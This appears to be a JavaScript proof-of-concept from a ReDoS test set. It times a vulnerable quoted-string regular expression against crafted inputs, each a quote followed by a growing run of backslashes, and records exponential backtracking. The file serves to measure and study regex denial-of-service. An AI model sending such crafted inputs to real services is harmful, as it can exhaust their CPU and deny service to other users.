/* 4131
 * ^("(\\["\\]|[^"])*"|[^\n])*(\n|$)
 * EXPONENT
 * nums:3
 * EXPONENT AttackString:"""+"\\"*32+"! _1_EOA(iv)"
 */
var REGEX = /^("(\\["\\]|[^"])*"|[^\n])*(\n|$)/
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = '\"' + '\\'.repeat(i*1) + '! _1_EOA(iv)'
    REGEX.exec(attack_str)
    // REGEX.test(attack_str);
    // attack_str.search(REGEX)
    // attack_str.match(REGEX)
    var time_cost = Date.now() - time;
    console.log(i * 1 + ": " + time_cost+" ms")
}